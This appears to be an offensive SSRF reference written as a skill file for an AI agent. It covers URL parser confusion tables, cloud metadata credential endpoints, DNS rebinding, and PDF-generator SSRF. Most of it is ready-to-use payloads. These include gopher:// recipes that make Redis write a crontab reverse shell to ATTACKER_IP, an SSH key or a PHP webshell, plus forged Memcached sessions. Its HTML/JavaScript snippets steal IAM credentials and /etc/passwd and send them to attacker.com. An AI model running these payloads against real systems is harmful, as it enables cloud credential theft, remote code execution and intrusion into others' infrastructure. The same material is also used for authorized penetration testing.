# URL Parser Differentials & Advanced SSRF Techniques

> **AI LOAD INSTRUCTION**: Load this when you need URL parser confusion tables, full cloud metadata endpoint catalogs, gopher:// payload recipes, DNS rebinding deep dives, or headless-browser/PDF-generator SSRF patterns. Assumes the main [SKILL.md](./SKILL.md) is already loaded for fundamentals.

---

## 1. URL PARSER DIFFERENTIAL TABLE

Different URL parsers interpret ambiguous URLs differently. This is the core of SSRF filter bypass.

### 1.1 Authority Parsing (Who Is the Host?)

Test URL: `http://evil.com@safe.com/path`

| Parser | Resolved Host | Notes |
|---|---|---|
| Python `urllib.parse.urlparse` | `safe.com` | Treats `evil.com` as userinfo |
| Python `requests` | `safe.com` | Same as urllib |
| Java `java.net.URL` | `safe.com` | Userinfo before `@` |
| Java `java.net.URI` | `safe.com` | Same |
| PHP `parse_url` | `safe.com` | Userinfo before `@` |
| Node.js `url.parse` (legacy) | `safe.com` | Userinfo before `@` |
| Node.js `new URL()` (WHATWG) | `safe.com` | Same |
| Go `net/url.Parse` | `safe.com` | Same |
| cURL | `safe.com` | Sends to safe.com with auth evil.com |

**Exploit scenario**: filter checks host, request library resolves differently.

### 1.2 Backslash Handling

Test URL: `http://evil.com\@safe.com/path`

| Parser | Resolved Host | Notes |
|---|---|---|
| Python `urllib` | `evil.com\@safe.com` | Backslash NOT treated as separator |
| Python `requests` | `evil.com` | May treat `\` as path separator |
| Java `URL` | `evil.com\@safe.com` or error | Implementation-dependent |
| PHP `parse_url` | `safe.com` | Ignores backslash in authority |
| Node.js `url.parse` (legacy) | `evil.com` | `\` treated as `/` |
| Node.js `new URL()` | `evil.com` | `\` normalized to `/` |
| Go `net/url` | error or literal | Strict parsing |
| cURL | `evil.com` | Backslash treated as path separator |

### 1.3 Fragment (`#`) Handling

Test URL: `http://evil.com#@safe.com/path`

| Parser | Resolved Host | Notes |
|---|---|---|
| Python `urllib` | `evil.com` | `#` starts fragment, `@safe.com` in fragment |
| Python `requests` | `evil.com` | Same |
| Java `URL` | `evil.com` | Fragment stripped for connection |
| PHP `parse_url` | `evil.com` | `#` delimits fragment |
| Node.js `url.parse` | `evil.com` | Fragment parsed |
| cURL | `evil.com` | Fragment ignored for request |

**Exploit**: if filter uses parser that treats `#@safe.com` as fragment (sees `evil.com`), but the actual HTTP client sends to a different resolved host.

### 1.4 Null Byte / Encoded Separator

Test URL: `http://safe.com%00@evil.com/` and `http://safe.com%23@evil.com/`

| Parser | Behavior |
|---|---|
| Python `urllib` | `%00` may truncate at null in C-backed functions → sees `safe.com` |
| PHP `parse_url` | `%00` may truncate hostname → sees `safe.com` |
| Node.js `url.parse` | Decodes `%00` → potential truncation |
| Java `URL` | Usually rejects null byte |
| Go `net/url` | Usually rejects null byte |
| cURL (older) | May truncate at null → connects to `safe.com` but path leads to `evil.com` |

### 1.5 IPv6 Bracket Confusion

Test URL: `http://[::ffff:127.0.0.1]` and `http://[::ffff:169.254.169.254]`

| Parser | Behavior |
|---|---|
| Python `urllib` | Parses IPv6, resolves to mapped IPv4 |
| PHP `parse_url` | Parses IPv6 brackets correctly |
| Node.js | Parses IPv6 brackets |
| Java | Parses IPv6 brackets |
| Go | Parses IPv6 brackets |
| cURL | Connects to mapped IPv4 address |

**Exploit**: if filter blocks `127.0.0.1` but not `[::ffff:127.0.0.1]`.

### 1.6 Port Handling Differences

Test URL: `http://safe.com:80@evil.com/`

| Parser | Resolved Host |
|---|---|
| Python `urllib` | `evil.com` (treats `safe.com:80` as userinfo) |
| PHP `parse_url` | `evil.com` |
| Node.js `url.parse` | `evil.com` |
| Java `URL` | `evil.com` |

**Exploit**: filter sees `safe.com` in URL string via regex, but parser resolves to `evil.com`.

### 1.7 Triple-Slash File Protocol

Test URL: `file:///etc/passwd` vs `file://evil.com/etc/passwd`

| Parser | Behavior |
|---|---|
| cURL | `file:///etc/passwd` reads local; `file://evil.com/etc/passwd` reads from SMB on Windows |
| Python `urllib` | `file:///etc/passwd` reads local |
| Java | `file:///etc/passwd` reads local |
| Node.js | Depends on fetch library implementation |

---

## 2. FULL CLOUD METADATA ENDPOINT CATALOG

### 2.1 AWS EC2

```
# IMDSv1 (no auth — most critical)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-ipv4
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/network/interfaces/macs/
http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance
http://169.254.169.254/latest/dynamic/instance-identity/document

# IMDSv2 (token-based — bypass if SSRF can send PUT + custom headers)
# Step 1:
PUT http://169.254.169.254/latest/api/token
X-aws-ec2-metadata-token-ttl-seconds: 21600
# Step 2:
GET http://169.254.169.254/latest/meta-data/
X-aws-ec2-metadata-token: TOKEN_FROM_STEP1

# ECS Task Metadata (containers)
http://169.254.170.2/v2/credentials/<GUID>
# GUID from: AWS_CONTAINER_CREDENTIALS_RELATIVE_URI env var

# Lambda environment
file:///proc/self/environ  → AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN
```

### 2.2 Google Cloud Platform (GCP)

```
# Requires header: Metadata-Flavor: Google
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/zone
http://metadata.google.internal/computeMetadata/v1/instance/machine-type
http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/ip
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
http://metadata.google.internal/computeMetadata/v1/instance/attributes/
http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys

# Alternative IP (if metadata.google.internal is blocked):
http://169.254.169.254/computeMetadata/v1/  (with header)

# Bypass header requirement (if SSRF doesn't support custom headers):
# Some older GCP versions allowed without header — worth trying
# Also try: Metadata-Flavor: Google\r\nX-Ignore:
```

### 2.3 Microsoft Azure

```
# Requires header: Metadata: true
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
http://169.254.169.254/metadata/instance/network?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/
http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text

# Azure App Service
http://169.254.130.1/  (different IP than standard!)
```

### 2.4 DigitalOcean

```
# No auth header required
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/
http://169.254.169.254/metadata/v1/dns/nameservers
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/vendor-data
http://169.254.169.254/metadata/v1/floating_ip/ipv4/active
```

### 2.5 Alibaba Cloud (Aliyun)

```
# No auth header required
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/instance-id
http://100.100.100.200/latest/meta-data/hostname
http://100.100.100.200/latest/meta-data/image-id
http://100.100.100.200/latest/meta-data/region-id
http://100.100.100.200/latest/meta-data/ram/security-credentials/
http://100.100.100.200/latest/meta-data/ram/security-credentials/ROLE_NAME
http://100.100.100.200/latest/user-data
http://100.100.100.200/latest/meta-data/private-ipv4
http://100.100.100.200/latest/meta-data/eipv4
```

### 2.6 Oracle Cloud Infrastructure (OCI)

```
# Requires header: Authorization: Bearer Oracle
http://169.254.169.254/opc/v1/instance/
http://169.254.169.254/opc/v1/instance/metadata/
http://169.254.169.254/opc/v2/instance/  (v2 — requires auth header)
http://169.254.169.254/opc/v1/identity/cert.pem
http://169.254.169.254/opc/v1/identity/key.pem
http://169.254.169.254/opc/v1/identity/intermediate.pem
```

### 2.7 Kubernetes Service Account

```
# In-cluster service account token (file read via SSRF):
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
file:///var/run/secrets/kubernetes.io/serviceaccount/namespace

# Kubernetes API (from within cluster):
https://kubernetes.default.svc/api
https://kubernetes.default.svc/api/v1/namespaces
https://kubernetes.default.svc/api/v1/namespaces/default/secrets
https://kubernetes.default.svc/api/v1/namespaces/default/pods
https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets

# kubelet API (often no auth on port 10255):
http://NODE_IP:10255/pods
http://NODE_IP:10255/spec

# etcd (critical — contains all cluster state):
http://NODE_IP:2379/v2/keys/
http://NODE_IP:2379/v2/keys/registry/secrets/
```

### 2.8 Hetzner Cloud

```
http://169.254.169.254/hetzner/v1/metadata
http://169.254.169.254/hetzner/v1/metadata/hostname
http://169.254.169.254/hetzner/v1/metadata/instance-id
http://169.254.169.254/hetzner/v1/metadata/private-networks
```

### 2.9 OpenStack

```
http://169.254.169.254/openstack/latest/meta_data.json
http://169.254.169.254/openstack/latest/user_data
http://169.254.169.254/openstack/latest/network_data.json
```

---

## 3. GOPHER:// PAYLOAD RECIPES

`gopher://` allows sending raw TCP data — powerful when SSRF is combined with internal services that speak plaintext protocols.

### 3.1 Gopher → Redis

**Write crontab reverse shell**:

```
gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0Aping%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2464%0D%0A%0A%0A*/1 * * * * bash -i >%26 /dev/tcp/ATTACKER_IP/4444 0>%261%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A
```

Decoded RESP commands:
```
PING
SET 1 "\n\n*/1 * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n\n\n"
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SAVE
```

**Write SSH authorized_keys**:

```
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/root/.ssh/%0D%0ACONFIG%20SET%20dbfilename%20authorized_keys%0D%0ASET%20key%20%22%5Cn%5Cnssh-rsa%20AAAA...%20attacker%40host%5Cn%5Cn%22%0D%0ASAVE%0D%0A
```

**Write PHP webshell via Redis**:

```
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html/%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASET%20x%20%22%3C%3Fphp%20system%28%24_GET%5B%27c%27%5D%29%3B%3F%3E%22%0D%0ASAVE%0D%0A
```

### 3.2 Gopher → MySQL (No Password)

Target: MySQL with `skip-grant-tables` or empty root password.

```
gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%03%00%00%00%00%01%08%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00root%00%00mysql_native_password%00
```

**Tool: Gopherus** generates these payloads automatically:

```bash
python gopherus.py --exploit mysql
# Enter username: root
# Enter query: SELECT * FROM mysql.user

python gopherus.py --exploit redis
# Enter: php (for webshell)
```

### 3.3 Gopher → SMTP

Send email via internal SMTP server (port 25):

```
gopher://127.0.0.1:25/_HELO%20attacker%0D%0AMAIL%20FROM%3A%3Cattacker%40evil.com%3E%0D%0ARCPT%20TO%3A%3Cadmin%40target.com%3E%0D%0ADATA%0D%0ASubject%3A%20SSRF%20Test%0D%0A%0D%0AYou%20are%20vulnerable%0D%0A.%0D%0AQUIT%0D%0A
```

Decoded:
```
HELO attacker
MAIL FROM:<attacker@evil.com>
RCPT TO:<admin@target.com>
DATA
Subject: SSRF Test

You are vulnerable
.
QUIT
```

### 3.4 Gopher → FastCGI (PHP-FPM)

Execute PHP code via FastCGI protocol on port 9000:

```bash
# Use Gopherus:
python gopherus.py --exploit fastcgi
# Enter: /var/www/html/index.php
# Enter command: id
```

The generated payload sends a FastCGI `BEGIN_REQUEST` + `PARAMS` + `STDIN` that sets `PHP_VALUE` to `auto_prepend_file=php://input` and includes the command in the request body.

### 3.5 Gopher → Memcached

```
gopher://127.0.0.1:11211/_stats%0D%0A
gopher://127.0.0.1:11211/_get%20session:SESSIONID%0D%0A
gopher://127.0.0.1:11211/_set%20session:VICTIM%200%20900%2050%0D%0A{"user":"admin","role":"superadmin","id":1}%0D%0A
```

### 3.6 Gopher URL Encoding Rules

```
\r → %0D
\n → %0A
space → %20
/ → %2F (in path component; first / after host is literal)
_ after gopher://host:port/ → required prefix (discarded by protocol)
```

Double-encode if the SSRF endpoint URL-decodes once before fetching:
```
%0D%0A → %250D%250A
```

---

## 4. DNS REBINDING — DETAILED ATTACK FLOW

### 4.1 The Problem DNS Rebinding Solves

Many SSRF filters work by:
1. Resolving the hostname to an IP
2. Checking if the IP is internal/blocked
3. If allowed, making the HTTP request

DNS rebinding exploits the **time gap between steps 2 and 3**.

### 4.2 Attack Flow

```
1. Attacker controls DNS for evil.com
2. Victim app receives URL: http://evil.com/
3. App resolves evil.com → 1.2.3.4 (public IP, passes filter)
4. App makes HTTP request to evil.com
5. DNS TTL has expired; new resolution: evil.com → 127.0.0.1
6. HTTP library resolves again → gets 127.0.0.1
7. Request goes to 127.0.0.1 → internal resource accessed
```

### 4.3 TTL Manipulation

```
# Authoritative DNS server configuration:
# Response 1 (filter check): A 1.2.3.4, TTL=0
# Response 2 (actual request): A 127.0.0.1, TTL=0

# TTL=0 forces re-resolution on every request
# Some resolvers enforce minimum TTL (30s, 60s) — timing matters
```

### 4.4 Tools and Services

```bash
# rbndr.us — free DNS rebinding service
# Format: FIRST_IP.SECOND_IP.rbndr.us
# Example:
http://7f000001.01020304.rbndr.us/
# Alternates between 127.0.0.1 and 1.2.3.4

# ceye.io — DNS rebinding + OOB exfil
# singularity — full DNS rebinding attack framework
# https://github.com/nccgroup/singularity

# Custom authoritative DNS (Python):
# Use dnslib to serve alternating A records with TTL=0
```

### 4.5 DNS Rebinding vs TOCTOU

If the application resolves DNS **once** and uses the resolved IP directly, DNS rebinding won't work. Look for:

```
# Vulnerable pattern (two resolutions):
ip = dns_resolve(hostname)     # check
if not is_internal(ip): allow
response = http_get(hostname)  # use (re-resolves!)

# Not vulnerable (single resolution):
ip = dns_resolve(hostname)     # check
if not is_internal(ip): allow
response = http_get(ip)        # uses resolved IP directly
```

### 4.6 DNS Rebinding for IMDSv2 Bypass

```
# IMDSv2 blocks requests with X-Forwarded-For header
# But DNS rebinding hits from the instance itself:
1. SSRF reaches attacker-controlled DNS name
2. First resolution → public IP (passes filter)
3. Second resolution → 169.254.169.254
4. Request reaches IMDS from instance's own network → no X-Forwarded-For → success
```

---

## 5. PDF / SCREENSHOT GENERATOR SSRF

### 5.1 wkhtmltopdf

Converts HTML to PDF. Processes `<iframe>`, `<img>`, `<link>`, `<script>` tags — each triggers a server-side fetch.

```html
<!-- Direct SSRF -->
<iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="600"></iframe>

<!-- Via image tag -->
<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">

<!-- Via CSS -->
<link rel="stylesheet" href="http://169.254.169.254/latest/user-data">

<!-- Via @import in style -->
<style>@import url('http://169.254.169.254/latest/meta-data/');</style>

<!-- Via redirect (if direct IP is blocked) -->
<iframe src="http://attacker.com/redirect?url=http://169.254.169.254/latest/meta-data/"></iframe>

<!-- JavaScript-based (if JS is enabled in wkhtmltopdf) -->
<script>
document.write('<img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/">');
</script>

<!-- Local file read -->
<iframe src="file:///etc/passwd" width="800" height="600"></iframe>
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(this.responseText)};
x.open("GET","file:///etc/passwd");
x.send();
</script>
```

### 5.2 WeasyPrint

Python HTML/CSS to PDF converter. Processes CSS `@import`, `url()`, `<link>`, `<img>`.

```html
<!-- CSS url() function -->
<link rel="attachment" href="file:///etc/passwd">

<!-- @font-face with url() -->
<style>
@font-face {
  font-family: 'exfil';
  src: url('http://169.254.169.254/latest/meta-data/');
}
</style>

<!-- attachment link (WeasyPrint specific — embeds file in PDF) -->
<link rel="attachment" href="file:///etc/shadow">
```

### 5.3 Chrome Headless / Puppeteer

```html
<!-- Standard fetch-based -->
<iframe src="http://169.254.169.254/latest/meta-data/"></iframe>

<!-- JavaScript SSRF (Chrome headless has full JS engine) -->
<script>
fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
  .then(r => r.text())
  .then(t => {
    document.body.innerText = t;
  });
</script>

<!-- WebSocket for port scanning -->
<script>
var ws = new WebSocket('ws://127.0.0.1:6379');
ws.onerror = function() { document.title = 'closed'; };
ws.onopen = function() { document.title = 'open'; };
</script>

<!-- DNS prefetch for OOB exfil -->
<link rel="dns-prefetch" href="//data.attacker.com">
```

### 5.4 PhantomJS (Legacy but Still Found)

```html
<script>
var page = require('webpage').create();
page.open('http://169.254.169.254/latest/meta-data/', function(status) {
  console.log(page.content);
  phantom.exit();
});
</script>
```

### 5.5 Detection Fingerprints

| Generator | User-Agent Pattern |
|---|---|
| wkhtmltopdf | `wkhtmltopdf`, `wkhtmltoimage` |
| Chrome Headless | `HeadlessChrome` |
| PhantomJS | `PhantomJS` |
| WeasyPrint | `WeasyPrint` |
| Puppeteer | `HeadlessChrome` (same as Chrome Headless) |

### 5.6 Exfiltration When Output Is Not Visible

If the PDF/screenshot doesn't show the fetched content directly:

```html
<!-- Exfiltrate via external request with data in URL -->
<script>
fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
  .then(r => r.text())
  .then(t => {
    new Image().src = 'http://attacker.com/exfil?data=' + btoa(t);
  });
</script>

<!-- Exfiltrate via DNS (longer data) -->
<script>
fetch('file:///etc/passwd')
  .then(r => r.text())
  .then(t => {
    var encoded = btoa(t).substring(0, 60);
    var img = new Image();
    img.src = 'http://' + encoded + '.attacker.com/';
  });
</script>
```

---

## 6. ADDITIONAL BYPASS TECHNIQUES

### 6.1 Open Redirect Chaining

```
http://trusted.com/redirect?url=http://169.254.169.254/latest/meta-data/
http://trusted.com/login?next=http://169.254.169.254/latest/meta-data/
```

If SSRF filter allows `trusted.com` and `trusted.com` has an open redirect → bypass.

### 6.2 URL Shorteners

```
# Create short URL pointing to metadata endpoint:
https://bit.ly/XXXXX → http://169.254.169.254/latest/meta-data/

# Filter sees: bit.ly (allowed domain)
# HTTP client follows redirect → internal IP
```

### 6.3 Enclosed Alphanumeric Characters

```
# Unicode enclosed letters that normalize to ASCII:
http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ → http://example.com
http://①②⑦.⓪.⓪.① → may resolve to 127.0.0.1

# Fullwidth characters:
http://１２７．０．０．１ (fullwidth digits)
```

### 6.4 CRLF Injection in SSRF

If the URL is used in a raw HTTP request:

```
http://attacker.com/%0D%0AHost:%20169.254.169.254%0D%0A
```

May inject additional headers or split the request to reach internal services.

### 6.5 Protocol Smuggling via HTTPS → HTTP Downgrade

Some libraries follow redirects from HTTPS to HTTP, losing TLS:

```
https://attacker.com/redirect → 302 → http://169.254.169.254/
```

If the filter only allows HTTPS URLs but the client follows HTTP redirects → bypass.
